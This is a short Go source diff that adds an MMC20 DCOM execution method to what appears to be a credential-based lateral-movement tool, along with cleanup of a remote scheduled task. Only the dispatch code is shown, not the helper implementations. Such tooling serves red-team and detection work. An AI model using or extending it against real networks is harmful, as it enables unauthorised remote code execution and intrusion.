@@ -118,6 +118,13 @@ func handlePipeSession(target, user, pass, domain, name, dropmethod string, runa
 				fmt.Println(err.Error())
 			}
 		}
+	} else if dropmethod == "mmc20" {
+		cmd := fmt.Sprintf("%s -name %s", targetFile, name)
+		err = executeMMCLateralMovement(user, pass, domain, target, cmd)
+		if err != nil {
+			fmt.Printf("Failed to execute command via DCOM (mmc20): %v\n", err)
+			return
+		}
 	}
 
 	// START User Data
@@ -253,6 +260,13 @@ func handlePipeSession(target, user, pass, domain, name, dropmethod string, runa
 			err = deleteRemoteService(target, user, pass, domain, name)
 			if err != nil {
 				log.Printf("Failed to delete service: %v\n", err)
+			}
+		}
+	} else if dropmethod == "task" {
+		if !nodelete {
+			err = deleteRemoteScheduledTask(target, name, user, pass, domain)
+			if err != nil {
+				fmt.Printf("Failed to delete task: %v\n", err)
 			}
 		}
 	}
